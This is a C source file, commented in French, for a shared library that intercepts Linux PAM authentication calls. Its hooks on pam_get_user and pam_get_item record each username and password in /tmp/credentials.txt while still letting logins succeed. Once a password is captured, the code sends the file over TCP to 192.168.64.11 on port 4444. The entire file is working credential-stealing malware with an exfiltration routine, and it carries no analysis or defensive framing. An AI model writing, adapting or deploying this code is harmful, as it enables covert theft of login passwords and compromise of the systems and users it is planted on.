#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <syslog.h>
#include <errno.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

// Définition des pointeurs pour les fonctions PAM d'origine
typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);

// Chemin du fichier pour stocker temporairement les credentials
#define CREDENTIALS_FILE "/tmp/credentials.txt"

// Fonction pour obtenir l'heure actuelle en tant que chaîne
static const char *get_current_time() {
    static char buffer[20];
    time_t raw_time = time(NULL);
    struct tm *time_info = localtime(&raw_time);
    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", time_info);
    return buffer;
}

// Fonction pour écrire les credentials dans un fichier local
static void write_to_file(const char *type, const char *data) {
    FILE *file = fopen(CREDENTIALS_FILE, "a");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir %s : %m", CREDENTIALS_FILE);
        return;
    }
    fprintf(file, "[%s] %s : %s\n", get_current_time(), type, data);
    fclose(file);
}

// Fonction pour envoyer les données via TCP
static void send_file_tcp(const char *remote_host, int remote_port) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[1024];
    FILE *file;

    // Création du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        syslog(LOG_ERR, "[ERROR] Échec de la création du socket : %m");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(remote_port);
    inet_pton(AF_INET, remote_host, &server_addr.sin_addr);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        syslog(LOG_ERR, "[ERROR] Échec de la connexion au serveur : %m");
        close(sock);
        return;
    }

    // Lecture et envoi du fichier
    file = fopen(CREDENTIALS_FILE, "r");
    if (!file) {
        syslog(LOG_ERR, "[ERROR] Impossible d'ouvrir le fichier local pour l'envoi");
        close(sock);
        return;
    }

    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        if (send(sock, buffer, bytes_read, 0) < 0) {
            syslog(LOG_ERR, "[ERROR] Échec de l'envoi des données : %m");
            fclose(file);
            close(sock);
            return;
        }
    }

    fclose(file);
    close(sock);
}

// Intercepteur pour pam_get_user
int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
    static pam_get_user_t original_pam_get_user = NULL;

    if (!original_pam_get_user) {
        original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
        if (!original_pam_get_user) {
            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_user : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_user(pamh, user, prompt);
    if (retval == PAM_SUCCESS && *user) {
        // On écrit le login
        write_to_file("Login", *user);
    }

    return retval; // On ne bloque pas, renvoie le code PAM initial
}

// Intercepteur pour pam_get_item
int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
    static pam_get_item_t original_pam_get_item = NULL;

    if (!original_pam_get_item) {
        original_pam_get_item = (pam_get_item_t)dlsym(RTLD_NEXT, "pam_get_item");
        if (!original_pam_get_item) {
            syslog(LOG_ERR, "[ERROR] Impossible de localiser pam_get_item : %s", dlerror());
            return PAM_SYSTEM_ERR;
        }
    }

    int retval = original_pam_get_item(pamh, item_type, item);
    if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
        // On récupère le mot de passe
        write_to_file("Mot de passe", (const char *)*item);

        // Envoi du fichier après avoir capturé le mot de passe
        send_file_tcp("192.168.64.11", 4444);
    }

    return retval;
}

